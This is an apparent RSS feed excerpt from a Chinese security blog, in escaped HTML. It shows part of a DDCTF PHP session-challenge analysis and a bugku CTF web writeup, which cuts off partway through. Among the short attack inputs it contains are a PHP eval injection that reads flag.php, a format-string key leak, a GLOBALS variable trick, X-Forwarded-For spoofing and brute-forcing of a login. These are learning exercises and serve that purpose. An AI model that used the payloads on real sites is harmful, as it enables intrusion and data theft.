&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if(!empty($_POST[&amp;#34;nickname&amp;#34;])) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $arr = array($_POST[&amp;#34;nickname&amp;#34;],$this-&amp;gt;eancrykey);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $data = &amp;#34;Welcome my friend %s&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          foreach ($arr as $k =&amp;gt; $v) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;              $data = sprintf($data,$v);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response($data,&amp;#34;Welcome&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($session[&amp;#39;ip_address&amp;#39;] != $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#39;the ip addree not match&amp;#39;.&amp;#39;error&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//ip_address 要写自己的ip
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      if($session[&amp;#39;user_agent&amp;#39;] != $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;]) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          parent::response(&amp;#39;the user agent not match&amp;#39;,&amp;#39;error&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          return FALSE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }//user_agent 内容要和 http_user_agent的匹配
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      return TRUE;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }//看起来可以动手脚的只有session_id?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  private function session_create() {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $sessionid = &amp;#39;&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      while(strlen($sessionid) &amp;lt; 32) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $sessionid .= mt_rand(0,mt_getrandmax());
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $userdata = array(
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;session_id&amp;#39; =&amp;gt; md5(uniqid($sessionid,TRUE)),
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;ip_address&amp;#39; =&amp;gt; $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;user_agent&amp;#39; =&amp;gt; $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;],
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          &amp;#39;user_data&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $cookiedata = serialize($
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $cookiedata = $cookiedata.md5($this-&amp;gt;eancrykey.$cookiedata);
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      $expire = $this-&amp;gt;cookie_expiration + time();
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;      setcookie(
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_name,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $cookiedata,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $expire,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_path,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_domain,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          $this-&amp;gt;cookie_secure
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;          );
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$ddctf = new Session();
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$ddctf-&amp;gt;index();
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到&lt;code&gt;key&lt;/code&gt;之后构造ddctfid:&lt;/p&gt;</description>
    </item>
    <item>
      <title>流量分析</title>
      <link>https://dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</link>
      <pubDate>Mon, 22 Apr 2019 04:16:47 +0000</pubDate>
      <guid>https://dragonbox.top/posts/sec-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;bugku 中的部分misc题目&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>密码学题目</title>
      <link>https://dragonbox.top/posts/ctf-crypto/</link>
      <pubDate>Mon, 22 Apr 2019 04:14:20 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-crypto/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;记录密码学刷过的题目&lt;/p&gt;
&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>bugku writeup</title>
      <link>https://dragonbox.top/posts/ctf-bugku-writeup/</link>
      <pubDate>Mon, 22 Apr 2019 04:13:30 +0000</pubDate>
      <guid>https://dragonbox.top/posts/ctf-bugku-writeup/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;纪念那段岁月&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;web3&#34;&gt;web3&lt;/h2&gt;
&lt;p&gt;网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，
用ctrl+u查看源代码，发现一串&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  &amp;lt;!--&amp;amp;#75;&amp;amp;#69;&amp;amp;#89;&amp;amp;#123;&amp;amp;#74;&amp;amp;#50;&amp;amp;#115;
  &amp;amp;#97;&amp;amp;#52;&amp;amp;#50;&amp;amp;#97;&amp;amp;#104;&amp;amp;#74;&amp;amp;#75;&amp;amp;#45;
  &amp;amp;#72;&amp;amp;#83;&amp;amp;#49;&amp;amp;#49;&amp;amp;#73;&amp;amp;#73;&amp;amp;#73;&amp;amp;#125;--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是unicode，转码即可&lt;/p&gt;
&lt;h2 id=&#34;你必须让他停下来&#34;&gt;你必须让他停下来！&lt;/h2&gt;
&lt;p&gt;查看源代码竟然直接有flag了，网上的解法是抓包&lt;/p&gt;
&lt;h2 id=&#34;本地包含&#34;&gt;本地包含&lt;/h2&gt;
&lt;p&gt;解法:利用hellow构造payload
$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。
递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对
eval并无影响，对于eval来说，和eval（$a）是一样的。&lt;/p&gt;
&lt;p&gt;payload：/index.php?hello = show_source(&amp;lsquo;flag.php&amp;rsquo;)
网上的payload：/index.php?hello=1);show_source(&amp;lsquo;flag.php&amp;rsquo;);var_dump(&lt;/p&gt;
&lt;h2 id=&#34;域名解析&#34;&gt;域名解析&lt;/h2&gt;
&lt;p&gt;编辑etc/hosts添加一条123.206.87.240	 flag.bugku.com，
在浏览器中打开flag.bugku.com即可得到flag。&lt;/p&gt;
&lt;p&gt;反思：host请求头是http1.1添加的东西，
添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。&lt;/p&gt;
&lt;p&gt;添加host之前访问ip地址结果显示错误400（缺少host）
添加host之后访问ip地址结果显示错误403（读取访问被禁）&lt;/p&gt;
&lt;h2 id=&#34;你必须让他停下&#34;&gt;你必须让他停下&lt;/h2&gt;
&lt;p&gt;使用burpsuite的repeater功能进行抓包操作，
通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag&lt;/p&gt;
&lt;h2 id=&#34;变量1&#34;&gt;变量1&lt;/h2&gt;
&lt;p&gt;函数知识：
isset（）判断是否有输入
pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0&lt;del&gt;9 a&lt;/del&gt;z A~Z，
输入的内容被限定了，所以不能输入代码&lt;/p&gt;
&lt;p&gt;输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag&lt;/p&gt;
&lt;h2 id=&#34;web5&#34;&gt;Web5&lt;/h2&gt;
&lt;p&gt;查看源代码，发现jother编码，打开控制台输入就行了&lt;/p&gt;
&lt;h2 id=&#34;头等舱&#34;&gt;头等舱&lt;/h2&gt;
&lt;p&gt;打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，
点击显示头文件源代码，显示flag（注释形式）&lt;/p&gt;
&lt;h2 id=&#34;网站被黑&#34;&gt;网站被黑&lt;/h2&gt;
&lt;p&gt;扫描端口&lt;/p&gt;
&lt;p&gt;发现登陆界面&lt;/p&gt;
&lt;p&gt;然后用burpsuite的intruder功能破解&lt;/p&gt;
&lt;h2 id=&#34;管理员系统&#34;&gt;管理员系统&lt;/h2&gt;
&lt;p&gt;实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，
也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。
也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，
都会在尾部添加一个代理的ip，
X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。
同时查看网页源代码发现，有一串注释，查到说是base64编码，
特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，
添加X-Forwarded-For：127。0.0.1后发送，得到了flag&lt;/p&gt;
&lt;p&gt;参考资料：ctf中常见的编码格式： &lt;a href=&#34;https://www.cnblogs.com/gwind/p/7997922.html&#34;&gt;https://www.cnblogs.com/gwind/p/7997922.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;web4&#34;&gt;web4&lt;/h2&gt;
&lt;p&gt;查看源代码，发现一串url编码的东西，
Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%66%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%6e%63%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%69%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%6e%20%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%68%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%63%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%53%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%62%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;6d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%69%&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;74&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;f&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;e&lt;span 